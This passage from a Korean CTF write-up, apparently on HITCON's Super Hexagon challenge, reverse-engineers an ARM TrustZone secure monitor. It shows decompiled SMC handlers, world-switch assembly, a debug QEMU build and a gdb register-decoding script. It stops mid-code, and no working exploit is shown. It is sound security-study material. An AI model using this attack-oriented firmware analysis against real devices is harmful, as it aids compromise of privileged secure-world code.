있다.\n그리고 분석을 더 해보니까 S-EL3는 flash에서 돌아서 수정 불가능한 메모리로써 MMIO 방식으로 동작한다. 사실 실행되는 코드도 적어서 flash로 올려서 돌리는것도 코드 무결성을 보장하는데 되게 현명한 방법이라는 생각이 들었다.\nDebugging the Secure world qemu에서 32bit 디버깅을 지원하지 않는다. 그래서 직접 빌드했다. github에서 v3.0.0 checkout해서 빌드하려 했더니 오류나길래 직접 공식 사이트에서 소스 코드를 받아서 빌드했다\nwget https://download.qemu.org/qemu-3.0.0.tar.xz tar -xvf ./qemu-3.0.0.tar.xz cd qemu-3.0.0 ./configure --target-list=aarch64-softmmu --disable-werror make -j 4 egl-helpers.h에 #include \u0026lt;X11/Xlib.h\u0026gt;를 넣어주고 빌드했다. static 빌드하고 싶었는데 xkbcommon 때문에 계속 실패해서 그냥 했다.\n빌드한거 옮겨서 세팅했다.\n#!/bin/sh #!/bin/sh /home/super_hexagon/qemu-system-aarch64_debug_arm32 -nographic -machine hitcon -cpu hitcon -bios /home/super_hexagon/bios.bin -monitor /dev/null 2\u0026gt;/dev/null -serial stdio -s 화면이 프린트 안돼서 serial에 stdio 줘봤더니 잘 프린트된다. 디버거도 ARM32로 잘 잡힌다.\nAnalyzing the secure monitor 이제 secure memory를 직접 봐야하기 때문에 로컬에서 디버깅을 시작했다.\np = process(\u0026#39;./local_debug.sh\u0026#39;) 그냥 전에 익스플로잇 코드에서 이렇게 바꿔주면 전에 미리 만들어뒀던 gdbscript로 secure memory를 볼 수 있다. secure world 전환 이전에 secure memory를 볼일이 종종 있어서 로컬이 제일 편하다.\n부팅 과정에서 가장 높은 exception level로 부팅을 시도하기에 전에 분석했었던 S-EL3의 부트로더부분으로 돌아가야한다. 거기서 VBAR_EL3가 0x2000인 것을 얻을 수 있다. 일단 EL2에서 S-EL3를 바로 공격하는게 가능한지 확인해봤다.\nlong * FUN_00000330(uint x0,long x1,undefined8 2,undefined8 x3) { ulong uVar1; long *plVar2; ulong in_x7; uVar1 = FUN_00000254(); if ((in_x7 \u0026amp; 1) == 0) { if (x0 != 0x83000002) { if (x0 == 0x83000007) { FUN_00000ad0(0); plVar2 = (long *)FUN_0000089c(1); FUN_00000aec(1); FUN_00000bb4(1); *plVar2 = x1; return plVar2; } FUN_00000d28(); FUN_00000310(); } FUN_000006d0(\u0026amp;DAT_00001910); _DAT_0e002000 = 1; _DAT_0e002420 = x1; FUN_00000ad0(0); plVar2 = (long *)FUN_0000089c(1); FUN_00000aec(1); FUN_00000bb4(1); *plVar2 = 0; } else { uVar1 = uVar1 \u0026amp; 0xffffffff; /* save non-secure system register */ FUN_00000ad0(1); if (x0 == 0x83000001) { if (_DAT_0e002000 != 0) { plVar2 = (long *)FUN_0000089c(1); FUN_00000aec(1); FUN_00000bb4(1); *plVar2 = -1; return plVar2; } FUN_0000025c(); FUN_000002c8(); } FUN_00000b2c(0,_DAT_0e002420 + 0x20,0x1d3); FUN_00000aec(0); FUN_00000bb4(0); *(undefined8 *)(uVar1 * 0x220 + 0xe002468) = x3; *(undefined8 *)(uVar1 * 0x220 + 0xe002460) = 2; *(long *)(uVar1 * 0x220 + 0xe002458) = x1; *(ulong *)(uVar1 * 0x220 + 0xe002450) = (ulong)x0; plVar2 = (long *)(uVar1 * 0x220 + 0xe002450); } return plVar2; } EL3의 bootloader에서 미리 0xe000000 쪽의 메모리를 0으로 밀었었다. FUN_00000ad0는 다음과 같이 기존 non-secure system register를 특정 secure memory의 주소 + 0x130에 저장한다. 이는 아마 gerneral purpose register까지 저장하기에 그런 것 같다.\n************************************************************* * FUNCTION ************************************************************* undefined FUN_00000dec () undefined w0:1 \u0026lt;RETURN\u0026gt; FUN_00000dec XREF[1]: FUN_00000ad0:00000ae0 (c) 00000dec 09 40 38 d5 mrs x9,spsr_el1 00000df0 2a 40 38 d5 mrs x10 ,elr_el1 00000df4 09 28 00 a9 stp x9,x10 ,[x0] 00000df8 0f 10 38 d5 mrs x15 ,sctlr_el1 00000dfc 30 10 38 d5 mrs x16 ,actlr_el1 00000e00 0f 40 01 a9 stp x15 ,x16 ,[x0, #0x10 ] 00000e04 51 10 38 d5 mrs x17 ,cpacr_el1 00000e08 09 00 3a d5 mrs x9,csselr_el1 00000e0c 11 24 02 a9 stp x17 ,x9,[x0, #0x20 ] 00000e10 0a 41 3c d5 mrs x10 ,sp_el1 00000e14 0b 52 38 d5 mrs x11 ,esr_el1 00000e18 0a 2c 03 a9 stp x10 ,x11 ,[x0, #0x30 ] 00000e1c 0c 20 38 d5 mrs x12 ,ttbr0_el1 00000e20 2d 20 38 d5 mrs x13 ,ttbr1_el1 00000e24 0c 34 04 a9 stp x12 ,x13 ,[x0, #0x40 ] 00000e28 0e a2 38 d5 mrs x14 ,mair_el1 00000e2c 0f a3 38 d5 mrs x15 ,amair_el1 00000e30 0e 3c 05 a9 stp x14 ,x15 ,[x0, #0x50 ] 00000e34 50 20 38 d5 mrs x16 ,tcr_el1 00000e38 91 d0 38 d5 mrs x17 ,tpidr_el1 00000e3c 10 44 06 a9 stp x16 ,x17 ,[x0, #0x60 ] 00000e40 49 d0 3b d5 mrs x9,tpidr_el0 00000e44 6a d0 3b d5 mrs x10 ,tpidrro_el0 00000e48 09 28 07 a9 stp x9,x10 ,[x0, #0x70 ] 00000e4c 0d 74 38 d5 mrs x13 ,par_el1 00000e50 0e 60 38 d5 mrs x14 ,far_el1 00000e54 0d 38 08 a9 stp x13 ,x14 ,[x0, #0x80 ] 00000e58 0f 51 38 d5 mrs x15 ,afsr0_el1 00000e5c 30 51 38 d5 mrs x16 ,afsr1_el1 00000e60 0f 40 09 a9 stp x15 ,x16 ,[x0, #0x90 ] 00000e64 31 d0 38 d5 mrs x17 ,contextidr_el1 00000e68 09 c0 38 d5 mrs x9,vbar_el1 00000e6c 11 24 0a a9 stp x17 ,x9,[x0, #0xa0 ] 00000e70 0a 9c 3b d5 mrs x10 ,pmcr_el0 00000e74 0a 58 00 f9 str x10 ,[x0, #0xb0 ] 00000e78 c0 03 5f d6 ret 아마 SEL2는 구현되지 않아서 최대 EL1까지의 레지스터만 저장하는 것으로 보인다.\n전에 trustzone 구현 메뉴얼을 살펴봤다. 그때 SCR_EL3.NS를 반전시켜 non-secure과 secure 전환을 한다고 했었는데, 그전에 이렇게 system register의 save/load가 필요했다 그렇다면 이런 save 함수가 있으니 이는 secure world 진입 직전일 것이고, 당연히 stack context 복구나 saved system registers를 다시 restore하는 함수도 있을 것임을 알 수 있다. 이런 구조를 염두에 두고 분석하면 쉽게 분석할 수 있다.\nlong * FUN_00000330(uint x0,long x1,undefined8 x2,undefined8 x3) { ulong uVar1; long *plVar2; ulong non_secure; uVar1 = FUN_00000254(); if ((non_secure \u0026amp; 1) == 0) { if (x0 != 0x83000002) { if (x0 == 0x83000007) { save_el1_sysregs(0); plVar2 = (long *)get_secure_mem(1); restore_sysregs(1); set_spelx(1); *plVar2 = x1; return plVar2; } FUN_00000d28(); do_panic(); } /* tee os initialized */ print_log(\u0026amp;DAT_00001910); _is_booted = 1; _DAT_0e002420 = x1; save_el1_sysregs(0); plVar2 = (long *)get_secure_mem(1); restore_sysregs(1); set_spelx(1); *plVar2 = 0; } else { uVar1 = uVar1 \u0026amp; 0xffffffff; /* save non-secure system register */ save_el1_sysregs(1); if (x0 == 0x83000001) { if (_is_booted != 0) { plVar2 = (long *)get_secure_mem(1); restore_sysregs(1); set_spelx(1); *plVar2 = -1; return plVar2; } FUN_0000025c(); FUN_000002c8(); } FUN_00000b2c(0,_DAT_0e002420 + 0x20,0x1d3); restore_sysregs(0); set_spelx(0); *(undefined8 *)(uVar1 * 0x220 + 0xe002468) = x3; *(undefined8 *)(uVar1 * 0x220 + 0xe002460) = x2; *(long *)(uVar1 * 0x220 + 0xe002458) = x1; *(ulong *)(uVar1 * 0x220 + 0xe002450) = (ulong)x0; plVar2 = (long *)(uVar1 * 0x220 + 0xe002450); } return plVar2; } x0 == 0x83000001는 딱봐도 secure → normal이고 아래가 normal → secure이다. 그 위 부분들은 secure world에서 호출시에만 동작하니 일단 생략한다. 위 함수가 호출되기 전에 조금 흥미로운 작업을 수행한다.\nLAB_00002800 XREF[2]: 00002414 (j) , 00002614 (j) 00002800 00 01 80 d2 mov param_1 ,#0x8 00002804 79 f9 ff 97 bl FUN_00000de8 undefined FUN_00000de8() 00002808 76 f9 ff 97 bl FUN_00000de0 undefined FUN_00000de0() sp = 0xe002210 fill out general purpose regs LAB_0000280c XREF[2]: 00002418 (j) , 00002618 (j) 0000280c c0 f9 ff 97 bl FUN_00000f0c undefined FUN_00000f0c(undefined 00002810 e5 03 1f aa mov param_6 ,xzr 00002814 e6 03 00 91 mov param_7 ,sp 00002818 cc 88 40 f9 ldr x12 ,[param_7 , #0x110 ] 0000281c bf 40 00 d5 msr PState.SP,#0x0 00002820 9f 01 00 91 mov sp,x12 00002824 10 40 3e d5 mrs x16 ,spsr_el3 00002828 31 40 3e d5 mrs x17 ,elr_el3 0000282c 12 11 3e d5 mrs x18 ,scr_el3 00002830 d0 c4 11 a9 stp x16 ,x17 ,[param_7 , #0x118 ] 00002834 d2 80 00 f9 str x18 ,[x6, #param_12 ] 00002838 47 02 40 b3 bfxil param_8 ,x18 ,#0x0 ,#0x1 0000283c 06 f8 ff 97 bl FUN_00000854 undefined FUN_00000854(void) 00002840 da f9 ff 17 b FUN_00000fa8 undefined FUN_00000fa8(undefined -- Flow Override: CALL_RETURN (CALL_TERMINATOR) 디컴파일러에선 아예 보이지 않는데, 여기서 normal world context가 저장된 sp를 param_7(w6)에 넣고 spsr_el3, elr_el3, scr_el3를 저장한다. PState.SP에 0을 넣고 s-el3의 특정 stack 주소를 세팅해서 동작을 이어간다.\n************************************************************* * FUNCTION ************************************************************* undefined set_spelx () undefined w0:1 \u0026lt;RETURN\u0026gt; undefined8 Stack[-0x10]:8 local_10 XREF[1]: 00000bb4 (W) set_spelx XREF[6]: FUN_000001f8:00000214 (c) , FUN_00000330:0000039c (c) , FUN_00000330:00000404 (c) , FUN_00000330:00000488 (c) , FUN_00000330:000004f0 (c) , FUN_00000bd4:00000bfc (c) 00000bb4 fd 7b bf a9 stp x29 ,x30 ,[sp, #local_10 ]! 00000bb8 fd 03 00 91 mov x29 ,sp 00000bbc 38 ff ff 97 bl get_secure_mem world_ctx * get_secure_mem(uint6 00000bc0 bf 41 00 d5 msr PState.SP,#0x1 00000bc4 1f 00 00 91 mov sp,x0 00000bc8 bf 40 00 d5 msr PState.SP,#0x0 00000bcc fd 7b c1 a8 ldp x29 ,x30 ,[sp], #0x10 00000bd0 c0 03 5f d6 ret 여기서 sp_elxh를 세팅한다. 아까 normal world context가 sp_elxh가 가리키는 구조체였고 이전에 normal world context에 접근하나, secure world context에 접근하냐에 따라 S-EL3에 진입할 때 어떤 world context에 저장할지 결정된다.\n************************************************************* * FUNCTION ************************************************************* undefined FUN_00000fa8 (undefined param_1 , undefined par undefined w0:1 \u0026lt;RETURN\u0026gt; undefined w0:1 param_1 undefined w1:1 param_2 undefined w2:1 param_3 undefined w3:1 param_4 undefined w4:1 param_5 undefined w5:1 param_6 undefined w6:1 param_7 undefined w7:1 param_8 undefined Stack[0x0]:1 param_9 undefined Stack[0x8]:1 param_10 undefined8 Stack[0x110]:8 param_11 XREF[1]: 00000fb0 (W) undefined8 Stack[0x120]:8 ELR_EL3 undefined8 Stack[0x118]:8 SPSR_EL3 XREF[1]: 00000fb8 (R) undefined8 Stack[0x100]:8 SCR_EL3 XREF[1]: 00000fb4 (R) FUN_00000fa8 XREF[3]: Reset:000000b0 (c) , FUN_00000c90:00000cb4 (c) , FUN_00002400:00002840 (c) 00000fa8 f1 03 00 91 mov x17 ,sp 00000fac bf 41 00 d5 msr PState.SP,#0x1 00000fb0 f1 8b 00 f9 str x17 ,[sp, #param_11 ] 00000fb4 f2 83 40 f9 ldr x18 ,[sp, #SCR_EL3 ] 00000fb8 f0 c7 51 a9 ldp x16 ,x17 ,[sp, #SPSR_EL3 ] 00000fbc 12 11 1e d5 msr scr_el3 ,x18 00000fc0 10 40 1e d5 msr spsr_el3 ,x16 00000fc4 31 40 1e d5 msr elr_el3 ,x17 00000fc8 f5 ff ff 17 b FUN_00000f9c undefined FUN_00000f9c(undefined -- Flow Override: CALL_RETURN (CALL_TERMINATOR) 그리고 마지막으로 여기서 world switch를 수행한다. FUN_00000f9c에선 general purpose register 불러오고 eret을 수행한다.\n아무리 봐도 악용할만한 취약점이 보이지 않았다. 그래서 S-EL0 부터 공격하기로 결정했다.\nAnalyzing the Interaction Between the Normal World and the Secure World EL0 review 다시 EL0로 돌아가서 어떻게 처리되는지를 봐야한다.\nvoid load_trustlet(byte *param_1,int size) { ... iVar1 = tc_init_trustlet(iVar1,size); if (iVar1 == 0) { pTVar3 = (TCI *)mmap((void *)0x0,0x1000,3,0,0,-1); uVar2 = tc_register_wsm(pTVar3,0x1000); if (uVar2 != 0xffffffff) { tci_buf = pTVar3; tci_handle = uVar2; return; } ... 위와 같은 방식으로 초기화를 했었고 TA_bin이라는 이상한 바이너리를 넘겼었다. int load_key(int x,char *buf) { ... tci_buf-\u0026gt;cmd = 2; tci_buf-\u0026gt;index = x; tc_tci_call(tci_handle); if (tci_buf-\u0026gt;cmd == 0) { ... 위와 같이 tci_call로 키를 save, load를 했었다.\n************************************************************* * FUNCTION ************************************************************* undefined tc_init_trustlet () undefined w0:1 \u0026lt;RETURN\u0026gt; tc_init_trustlet XREF[2]: Entry Point (*) , load_trustlet:0040019c (c) 00401b74 a8 00 80 d2 mov x8,#0x5 00401b78 08 e0 bf f2 movk x8,#0xff00 , LSL #16 00401b7c 01 00 00 d4 svc 0x0 00401b80 c0 03 5f d6 ret ************************************************************* * FUNCTION ************************************************************* undefined tc_register_wsm () undefined w0:1 \u0026lt;RETURN\u0026gt; tc_register_wsm XREF[3]: Entry Point (*) , load_trustlet:00400174 (c) , load_trustlet:004001c8 (c) 00401b84 68 00 80 d2 mov x8,#0x3 00401b88 08 e0 bf f2 movk x8,#0xff00 , LSL #16 00401b8c 01 00 00 d4 svc 0x0 00401b90 c0 03 5f d6 ret ************************************************************* * FUNCTION ************************************************************* undefined tc_tci_call () undefined w0:1 \u0026lt;RETURN\u0026gt; tc_tci_call XREF[3]: Entry Point (*) , load_key:00400324 (c) , save_key:00400490 (c) 00401b94 c8 00 80 d2 mov x8,#0x6 00401b98 08 e0 bf f2 movk x8,#0xff00 , LSL #16 00401b9c 01 00 00 d4 svc 0x0 00401ba0 c0 03 5f d6 ret 위와 같은 x8 값을 갖는다.\nEL1 review void FUN_ffffffffc0008ba8(long param_1) { ... usr = (undefined *)0xffffffffffffffff; } } else { usr = (undefined *)0xffffffffffffffff; } } else if ((x8 \u0026amp; 0xff000000) == 0xff000000) { usr = (undefined *)FUN_ffffffffc0008a34(x8,x0,x1,x2); } else { usr = (undefined *)0xffffffffffffffff; } ... 위와 같이 따로 처리 로직이 존재한다.\nulong FUN_ffffffffc0008a34(long x8,ulong x0,ulong x1,ulong x2) { ulong uVar1; long lVar2; long lVar3; if (x8 == 0xff000005) { if ((x0 \u0026amp; 0xfff) == 0) { uVar1 = secure_monitor_call(0x83000005,x0 \u0026amp; 0xffffffff,x1 \u0026amp; 0xffffffff,0); } else { uVar1 = 0xffffffffffffffff; } } else if (x8 == 0xff000003) { if ((x1 \u0026amp; 0xfff) == 0) { if (x1 \u0026lt; 0x4001) { if ((x0 \u0026amp; 0xfff) == 0) { lVar2 = FUN_ffffffffc0009174(x0); if ((int)lVar2 == -1) { uVar1 = 0xffffffffffffffff; } else { for (uVar1 = x0 + 0x1000; uVar1 \u0026lt; x0 + x1; uVar1 = uVar1 + 0x1000) { lVar3 = FUN_ffffffffc0009174(uVar1); if ((int)lVar3 == -1) { return 0xffffffffffffffff; } if ((uVar1 + lVar2) - x0 != lVar3) { return 0xffffffffffffffff; } } uVar1 = secure_monitor_call(0x83000003,lVar2,x1,0); uVar1 = uVar1 \u0026amp; 0xffffffff; } } else { uVar1 = 0xffffffffffffffff; } } else { uVar1 = 0xffffffffffffffff; } } else { uVar1 = 0xffffffffffffffff; } } else if (x8 == 0xff000006) { if ((x0 \u0026amp; 0xfff) == 0) { uVar1 = secure_monitor_call(0x83000006,x0,0,0); } else { uVar1 = 0xffffffffffffffff; } } else { uVar1 = 0xffffffffffffffff; } return uVar1; } ************************************************************* * FUNCTION ************************************************************* undefined FUN_ffffffffc0009174 () undefined w0:1 \u0026lt;RETURN\u0026gt; FUN_ffffffffc0009174 XREF[5]: FUN_ffffffffc00086e8:ffffffffc00 FUN_ffffffffc0008a34:ffffffffc00 FUN_ffffffffc0008a34:ffffffffc00 FUN_ffffffffc0008ba8:ffffffffc00 FUN_ffffffffc0008ba8:ffffffffc00 fffc0009174 40 78 08 d5 at S1E0R, x0 fffc0009178 00 74 38 d5 mrs x0,par_el1 fffc000917c 01 00 40 92 and x1,x0,#0x1 fffc0009180 3f 04 00 f1 cmp x1,#0x1 fffc0009184 c0 00 00 54 b.eq LAB_ffffffffc000919c fffc0009188 01 00 9e d2 mov x1,#0xf000 fffc000918c e1 ff bf f2 movk x1,#0xffff , LSL #16 fffc0009190 e1 ff df f2 movk x1,#0xffff , LSL #32 fffc0009194 00 00 01 8a and x0,x0,x1 fffc0009198 c0 03 5f d6 ret LAB_ffffffffc000919c XREF[1]: ffffffffc0009184 (j) fffc000919c 00 00 80 92 mov x0,#-0x1 fffc00091a0 c0 03 5f d6 ret 실질적으로 약간의 넘겨진 메모리 주소 검사를 해주고 모두 secure monitor로 넘긴다.\nEL2 review ulong FUN_401003d8(long *saved_reg) { ... else if (EC_ == 0b00010111) { if (x0 == 0x83000003) { if (x1 \u0026lt; 0x3c001) { x0 = SMC_handler(0x83000003,x1 + 0x40000000); } else { x0 = -1; } } else { x0 = SMC_handler(x0,x1); } ... IPA → PA를 해주고 Secure monitor로 마저 넘긴다.\nS-EL3 world_ctx * FUN_00000330(uint x0,uint64_t x1,uint64_t x2,uint64_t x3) { ulong uVar1; world_ctx *pwVar2; ulong non_secure; uVar1 = ret_0(); if ((non_secure \u0026amp; 1) == 0) { if (x0 != 0x83000002) { if (x0 == 0x83000007) { save_el1_sysregs(0); pwVar2 = get_secure_mem(1); restore_sysregs(1); set_spelx(1); pwVar2-\u0026gt;x0 = x1; return pwVar2; } FUN_00000d28(); do_panic(); } /* tee os initialized */ print_log(\u0026amp;DAT_00001910); is_booted = 1; tmp.PC = x1; save_el1_sysregs(0); pwVar2 = get_secure_mem(1); restore_sysregs(1); set_spelx(1); pwVar2-\u0026gt;x0 = 0; } else { uVar1 = uVar1 \u0026amp; 0xffffffff; /* save non-secure system register */ save_el1_sysregs(1); if (x0 == 0x83000001) { if (is_booted != 0) { pwVar2 = get_secure_mem(1); restore_sysregs(1); set_spelx(1); pwVar2-\u0026gt;x0 = 0xffffffffffffffff; return pwVar2; } FUN_0000025c(); FUN_000002c8(); } FUN_00000b2c(0,tmp.PC + 0x20,0x1d3); restore_sysregs(0); set_spelx(0); (\u0026amp;wctx)[uVar1].x3 = x3; (\u0026amp;wctx)[uVar1].x2 = x2; (\u0026amp;wctx)[uVar1].x1 = x1; (\u0026amp;wctx)[uVar1].x0 = (ulong)x0; pwVar2 = \u0026amp;wctx + uVar1; } /* 0x000000000e002450 0x000000000e002210 */ return pwVar2; } 이제 호출되었을 때 어디로 가는지 확인해야할 필요가 있다.\nSPSR_EL3 structure \u0026amp; gdbscript AArch32에서 exception이 발생했을 때 M bits 인코딩은 위와 같다. AArch64 exception이 발생했을 때 M bits 인코딩은 위와 같다.\nimport gdb class CPSR(gdb.Command): def __init__(self): super(CPSR, self).__init__(\u0026#34;cpsr\u0026#34;, gdb.COMMAND_USER) def invoke(self, arg, from_tty): cpsr = (int(gdb.parse_and_eval(\u0026#34;$cpsr\u0026#34;))) mode = cpsr \u0026amp; 0b1111 is_thumb = (cpsr \u0026gt;\u0026gt; 4)\u0026amp;1 state = (cpsr \u0026gt;\u0026gt; 4)\u0026amp;1 IRQ = (cpsr \u0026gt;\u0026gt; 5)\u0026amp;1 FIQ = (cpsr \u0026gt;\u0026gt; 6)\u0026amp;1 cond = (cpsr \u0026gt;\u0026gt; 27)\u0026amp;0b1111 re = \u0026#39;\u0026#39; if not state: if 0b0000 == mode: re += \u0026#39;EL0t\u0026#39; # SP_EL0 elif 0b0100 == mode: re += \u0026#39;EL1t\u0026#39; # SP_EL0 elif 0b0101 == mode: re += \u0026#39;EL1h\u0026#39; # SP_EL1 elif 0b1000 == mode: re += \u0026#39;EL2t\u0026#39; # SP_EL0 elif 0b1001 == mode: re += \u0026#39;EL2h\u0026#39; # SP_EL2 elif 0b1100 == mode: re += \u0026#39;EL3t\u0026#39; # SP_EL0 elif 0b1101 == mode: re += \u0026#39;EL3h\u0026#39; # SP_EL3 else: re += \u0026#39;UNK\u0026#39; else: if 0b0000 == mode: re += \u0026#39;User\u0026#39; elif 0b0001 == mode: re += \u0026#39;FIQ\u0026#39; elif 0b0010 == mode: re += \u0026#39;IRQ\u0026#39; elif 0b0011 == mode: re += \u0026#39;Supervisor\u0026#39; elif 0b0110 == mode: re += \u0026#39;Monitor\u0026#39; elif 0b0111 == mode: re += \u0026#39;Abort\u0026#39; elif 0b1010 == mode: re += \u0026#39;Hyp\u0026#39; elif 0b1011 == mode: re += \u0026#39;Undefined\u0026#39; elif 0b1111 == mode: re += \u0026#39;System\u0026#39; else: re += \u0026#39;UNK\u0026#39; re += \u0026#39; | \u0026#39; if IRQ: re += \u0026#39;IRQ_MASKED | \u0026#39; elif FIQ: re += \u0026#39;FIQ_MASKED | \u0026#39; if is_thumb: re += \u0026#39;THUMB_MODE | \u0026#39; if state: re += \u0026#39;32-BIT | \u0026#39; else: re += \u0026#39;64-BIT | \u0026#39; re += f\u0026#39;COND_{hex(cond)[2:]}\u0026#39; print(re) class SPSR_EL3(gdb.Command): def __init__(self): super(SPSR_EL3, self).__init__(\u0026#34;spsr_el3\u0026#34;, gdb.COMMAND_USER) def invoke(self, arg, from_tty): spsr = (int(gdb.parse_and_eval(\u0026#34;$SPSR_EL3\u0026#34;))) mode = spsr \u0026amp; 0b1111 is_thumb = (spsr \u0026gt;\u0026gt; 4)\u0026amp;1 IRQ = (spsr \u0026gt;\u0026gt; 7)\u0026amp;1 FIQ = (spsr \u0026gt;\u0026gt; 6)\u0026amp;1 cond = (spsr \u0026gt;\u0026gt; 27)\u0026amp;0b11111 state = (spsr \u0026gt;\u0026gt; 4)\u0026amp;1 re = \u0026#39;\u0026#39; if not state: if 0b0000 == mode: re += \u0026#39;EL0t\u0026#39; # SP_EL0 elif 0b0100 == mode: re += \u0026#39;EL1t\u0026#39; # SP_EL0 elif 0b0101 == mode: re += \u0026#39;EL1h\u0026#39; # SP_EL1 elif 0b1000 == mode: re += \u0026#39;EL2t\u0026#39; # SP_EL0 elif 0b1001 == mode: re += \u0026#39;EL2h\u0026#39; # SP_EL2 elif 0b1100 == mode: re += \u0026#39;EL3t\u0026#39; # SP_EL0 elif 0b1101 == mode: re += \u0026#39;EL3h\u0026#39; # SP_EL3 else: re += \u0026#39;UNK\u0026#39; else: if 0b0000 == mode: re += \u0026#39;User\u0026#39; elif 0b0001 == mode: re += \u0026#39;FIQ\u0026#39; elif 0b0010 == mode: re += \u0026#39;IRQ\u0026#39; elif 0b0011 == mode: re += \u0026#39;Supervisor\u0026#39; elif 0b0110 == mode: re += \u0026#39;Monitor\u0026#39; elif 0b0111 == mode: re += \u0026#39;Abort\u0026#39; elif 0b1010 == mode: re += \u0026#39;Hyp\u0026#39; elif 0b1011 == mode: re += \u0026#39;Undefined\u0026#39; elif 0b1111 == mode: re += \u0026#39;System\u0026#39; else: re += \u0026#39;UNK\u0026#39; re += \u0026#39; | \u0026#39; if IRQ: re += \u0026#39;IRQ_MASKED | \u0026#39; elif FIQ: re += \u0026#39;FIQ_MASKED | \u0026#39; if is_thumb: re += \u0026#39;THUMB_MODE | \u0026#39; if state: re += \u0026#39;32-BIT | \u0026#39; else: re += \u0026#39;64-BIT | \u0026#39; re += f\u0026#39;COND_{hex(cond)[2:]}\u0026#39; print(re) CPSR() SPSR_EL3() 기존 cpsr도 같이 수정했다. AArch32 PE modes 근데 mode가 약간 생소하다. 그냥 이름만 있어보이게 나눠놓고 결국 결론은 S-EL1이다.\nDiving into BL1 again S-EL1을 보다가 못 읽겠어서 이번엔 aarch32 manual을 찾아서 읽어봤다. 그랬더니 이미 정의된 주소로 핸들링을 수행한다고 한다. Secure VBAR을 확인해야한다.\n************************************************************* * FUNCTION ************************************************************* undefined FUN_000014f4 () undefined r0:1 \u0026lt;RETURN\u0026gt; FUN_000014f4 XREF[1]: Reset:00000000 (T) , Reset:00000000 (j) 000014f4 00 80 a0 e1 cpy r8,r0 000014f8 2c 80 8f e5 str r8,[DAT_0000152c ] SCTLR 000014fc 10 0f 11 ee mrc p15,0x0 ,r0,cr1 ,cr0 ,0x0 SCTLR 00001500 01 00 c0 e3 bic r0,r0,#0x1 00001504 02 00 c0 e3 bic r0,r0,#0x2 00001508 04 00 c0 e3 bic r0,r0,#0x4 0000150c 08 00 c0 e3 bic r0,r0,#0x8 00001510 10 00 c0 e3 bic r0,r0,#0x10 00001514 01 0a c0 e3 bic r0,r0,#0x1000 00001518 10 0f 01 ee mcr p15,0x0 ,r0,cr1 ,cr0 ,0x0 VBAR 0000151c 10 8f 0c ee mcr p15,0x0 ,r8,cr12 ,cr0 ,0x0 00001520 36 00 00 eb bl FUN_00001600 undefined FUN_00001600() 00001524 5b 00 00 eb bl FUN_00001698 undefined FUN_00001698() LAB_00001528 XREF[1]: 00001528 (j) 00001528 fe ff ff ea b LAB_00001528 aarch64와 다르게 생소하게 접근한다. 읽는 법은 위처럼 읽으면 된다.\n근데 여기서 VBAR 인자가 뭔지 잘 모르겠다 그래서 부트로더로 다시 돌아가서 secure world가 어떻게 초기화되는지 분석해야한다.\nvoid FUN_ffffffffc0008000(void) { vbar_el1 = 0xffffffffc000a000; InstructionSynchronizationBarrier(); FUN_ffffffffc0009234(DAT_ffffffffc0008048,DAT_ffffffffc0008050); spsel = 0; FUN_ffffffffc0008228(); FUN_ffffffffc0008930(); FUN_ffffffffc0008210(); /* trustzone initialize */ FUN_ffffffffc00081e8(); FUN_ffffffffc00083a8(); FUN_ffffffffc000914c(); do { WaitForInterrupt(); } while( true ); } kernel의 첫 페이지는 IPA 0x0에 매핑되어있다. 그래서 실질적으로 rebase해서 EL1을 분석할 때는 초기 페이지들을 날리고 했어야했다. 어쨋든 FUN_ffffffffc0008210에서 TEE OS initialize를 한다.\n************************************************************* * FUNCTION ************************************************************* undefined FUN_ffffffffc00081e8 () undefined w0:1 \u0026lt;RETURN\u0026gt; undefined8 Stack[-0x10]:8 local_10 XREF[2]: ffffffffc00081e8 ffffffffc0008208 FUN_ffffffffc00081e8 XREF[1]: FUN_ffffffffc0008000:ffffffffc00 fffc00081e8 fd 7b bf a9 stp x29 ,x30 ,[sp, #local_10 ]! fffc00081ec fd 03 00 91 mov x29 ,sp fffc00081f0 03 00 80 d2 mov x3,#0x0 fffc00081f4 02 00 80 d2 mov x2,#0x0 fffc00081f8 01 00 80 d2 mov x1,#0x0 fffc00081fc 20 00 80 d2 mov x0,#0x1 fffc0008200 00 60 b0 f2 movk x0,#0x8300 , LSL #16 fffc0008204 d8 03 00 94 bl secure_monitor_call undefined secure_monitor_call() fffc0008208 fd 7b c1 a8 ldp x29 =\u0026gt;local_10 ,x30 ,[sp], #0x10 fffc000820c c0 03 5f d6 ret 이렇게 부른다.\nbool FUN_0000025c(void) { bool bVar1; ulong uVar2; uVar2 = ret_0(); bVar1 = DAT_0e000008 != 0; if (bVar1) { normal_ctx._536_4_ = 1; FUN_00000120(0xe000000,1,DAT_0e000008,0xe400000,1,2,(uVar2 \u0026amp; 0xffffffff) * 0x220 + 0xe002430); } return !bVar1; } 0xe000000가 보이는거 보니 boot argument 같은 것으로 보인다. BL1에서 0x68 만큼 copy한 데이터에 속한다. void FUN_00000120(undefined *param_1,int param_2,undefined8 param_3,undefined8 param_4, undefined8 param_5,undefined8 param_6,undefined4 *param_7) { undefined8 uVar1; undefined4 uVar2; uVar1 = mpidr_el1; *(undefined8 *)(param_7 + 2) = uVar1; *param_7 = 0; FUN_000008ac(param_7 + 8,0); uVar1 = sctlr_el3; if (((uint)uVar1 \u0026gt;\u0026gt; 0x19 \u0026amp; 1) == 0) { uVar2 = 4; } else { uVar2 = 6; } *param_1 = 1; param_1[1] = 1; *(undefined2 *)(param_1 + 2) = 0x58; *(undefined4 *)(param_1 + 4) = uVar2; *(undefined8 *)(param_1 + 8) = param_3; if (param_2 == 0) { *(undefined4 *)(param_1 + 0x10) = 0x3c5; } else { *(undefined4 *)(param_1 + 0x10) = 0x1d3; } print_log(s_(_TEE_PC:_%lx_000018d0,param_3); print_log(s_(_TEE_SPSR:_%x_000018e0,*(undefined4 *)(param_1 + 0x10)); set_zero(param_1 + 0x18,(char *)0x40); *(undefined8 *)(param_1 + 0x18) = param_4; *(undefined8 *)(param_1 + 0x20) = param_5; *(undefined8 *)(param_1 + 0x28) = param_6; return; } 위와 같이 초기화해준다. log print 과정에서 PC와 SPSR을 식별할 수 있다.\nvoid FUN_000009a0(world_ctx *secure_context,long param_2) { uint uVar1; long lVar2; undefined8 uVar3; uint uVar4; uint new_SCR; uint ns; ns = *(uint *)(param_2 + 4) \u0026amp; 1; set_zero((char *)secure_context,(char *)0x200); uVar3 = scr_el3; new_SCR = (uint)uVar3 \u0026amp; 0xfffff2f8; if (ns != 0) { new_SCR = new_SCR | 1; } uVar1 = *(uint *)(param_2 + 0x10); uVar4 = uVar1 \u0026gt;\u0026gt; 